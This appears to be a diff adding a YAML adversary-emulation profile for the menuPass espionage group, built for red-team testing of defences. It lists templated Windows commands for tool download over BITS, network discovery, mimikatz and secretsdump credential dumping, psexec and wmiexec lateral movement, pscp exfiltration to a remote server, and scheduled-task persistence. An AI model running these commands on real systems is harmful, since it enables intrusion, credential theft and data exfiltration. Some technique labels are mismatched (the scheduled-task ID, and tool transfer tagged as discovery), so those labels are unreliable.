@@ -1,0 +1,171 @@
+id: b5192070-dff1-4134-bf66-c6b87c7498af
+name: menuPass
+description: menuPass is thought to be a Chinese cyber espionage group associated with activity directed by elements of the PRC MSS. (Emu)
+objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
+atomic_ordering:
+- a750b196-8168-461a-8747-bdc4add107ac
+- 7877ec4d-3c11-40f2-9650-35261e4ac879
+- e132a235-fe43-45c2-a334-2f235a7646b5
+- d19678ac-3bca-475e-89d4-f452bfc2cc2a
+- b6026408-c815-47ca-bbb0-6b74591badc8
+- 814005f7-c8d3-45c8-aea2-45758b2d6e90
+- 9d543214-6476-429a-9ca1-cf12233b808c
+- ffb50e17-cb3c-4424-a4e7-99e3885f22cc
+- fe3d4de1-50bf-4241-9546-72dc757e696f
+- 4b1748e5-532c-453c-b195-557ce5550fef
+- 160a1e0f-0f9b-49bb-a0fe-7e362b51737f
+- b4fa6d2e-ed9c-4a86-81aa-19331983fe0d
+- ea4bc858-ba13-4f97-9df3-c543d8f3d44c
+- 8911d502-747a-4155-adcd-b03a1f284ee7
+- 236d1357-64f9-4a98-afc1-bccaa89aba8c
+abilities:
+ a750b196-8168-461a-8747-bdc4add107ac:
+  name:  Ingress Tool Transfer
+  tactic:  discovery
+  technique_name:  "Ingress Tool Transfer"
+  technique_id:  T1105
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Start-BitsTransfer -Source "http://#{bitsadmin_remote_ip}/#{bitsadmin_b64_encoded_string}" -Destination "C:\ProgramData\temp\#{bitsadmin_b64_encoded_string}"
+ 7877ec4d-3c11-40f2-9650-35261e4ac879:
+  name:  Network Share Discovery (2)
+  tactic:  discovery
+  technique_name:  "Network Share Discovery"
+  technique_id:  T1135
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       net use
+ e132a235-fe43-45c2-a334-2f235a7646b5:
+  name:  Remote System Discovery (2)
+  tactic:  discovery
+  technique_name:  "Remote System Discovery"
+  technique_id:  T1018
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       net view /domain
+ d19678ac-3bca-475e-89d4-f452bfc2cc2a:
+  name:  Remote System Discovery (2)
+  tactic:  discovery
+  technique_name:  "Remote System Discovery"
+  technique_id:  T1018
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Test-NetConnection "#{host_address}"
+ b6026408-c815-47ca-bbb0-6b74591badc8:
+  name:  Network Service Scanning (2)
+  tactic:  discovery
+  technique_name:  "Network Service Scanning"
+  technique_id:  T1046
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       "#{tcping_local_path}\tcping.exe" "#{tcping_remote_ip}" "#{tcping_remote_port}"
+ 814005f7-c8d3-45c8-aea2-45758b2d6e90:
+  name:  System Network Configuration Discovery (2)
+  tactic:  discovery
+  technique_name:  "System Network Configuration Discovery"
+  technique_id:  T1016
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       "#{nbtscan_local_path}\nbtscan.exe" #{nbt_ip_range}
+ 9d543214-6476-429a-9ca1-cf12233b808c:
+  name:  System Network Configuration Discovery (2)
+  tactic:  discovery
+  technique_name:  "System Network Configuration Discovery"
+  technique_id:  T1016
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       "#{netsess_local_path}\netsess.exe" #{netsess_remote_ip}
+ ffb50e17-cb3c-4424-a4e7-99e3885f22cc:
+  name:  OS Credential Dumping (2)
+  tactic:  credential-access
+  technique_name:  "OS Credential Dumping: LSASS Memory"
+  technique_id:  T1003.001
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       "#{mimikatz_local_path}\#{mimikatz_arch}\mimikatz.exe" "#{mimikatz_module}"
+ fe3d4de1-50bf-4241-9546-72dc757e696f:
+  name:  OS Credential Dumping
+  tactic:  credential-access
+  technique_name:  "OS Credential Dumping: Security Account Manager"
+  technique_id:  T1003.002
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       "#{secretsdump_local_path}\secretsdump.exe" "#{secretsdump_domain}"/"#{secretsdump_user}":"#{secretsdump_pass}"@"#{secretsdump_remote_host}"
+ 4b1748e5-532c-453c-b195-557ce5550fef:
+  name:  Service Execution
+  tactic:  lateral-movement
+  technique_name:  "System Services: Service Execution"
+  technique_id:  T1569.002
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       "#{psexec_local_path}\psexec.exe" "#{psexec_user}":"#{psexec_password}"@"#{psexec_remote_host}" "#{psexec_cmd}"
+ 160a1e0f-0f9b-49bb-a0fe-7e362b51737f:
+  name:  Archive Collected Data - Archive via Utility
+  tactic:  collection
+  technique_name:  "Archive Collected Data - Archive via Utility"
+  technique_id:  T1560.001
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       rar.exe a "#{rar_archive_name}" "#{rar_files}"
+ b4fa6d2e-ed9c-4a86-81aa-19331983fe0d:
+  name:  Recycle Bin Staging
+  tactic:  collection
+  technique_name:  "Local Data Staging"
+  technique_id:  T1074.001
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       copy #{copy_filename} "C:\$Recycle.Bin\"
+ ea4bc858-ba13-4f97-9df3-c543d8f3d44c:
+  name:  Transfer Data to Cloud Account
+  tactic:  exfiltration
+  technique_name:  "Transfer Data to Cloud Account"
+  technique_id:  T1537
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       "#{pscp_local_path}\pscp.exe" "#{pscp_exfil_files}" "#{pscp_user}"@"#{pscp_server}":/"#{pscp_drop_location}"
+ 8911d502-747a-4155-adcd-b03a1f284ee7:
+  name:  Windows Management Instrumentation
+  tactic:  execution
+  technique_name:  "Windows Management Instrumentation"
+  technique_id:  T1047
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       cscript.exe "#{wmiexec_local_path}\wmiexec.vbs" /shell "#{wmiexec_remote_host}"
+ 236d1357-64f9-4a98-afc1-bccaa89aba8c:
+  name:  Scheduled Task Persistence (2)
+  tactic:  persistence
+  technique_name:  "Scheduled Task/Job: Scheduled Task"
+  technique_id:  T1553.005
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       schtasks /create /sc "#{schtask_schedule}" /tn "#{schtask_taskname}" /tr "#{schtask_taskrun}" /ru "#{schtask_username}"
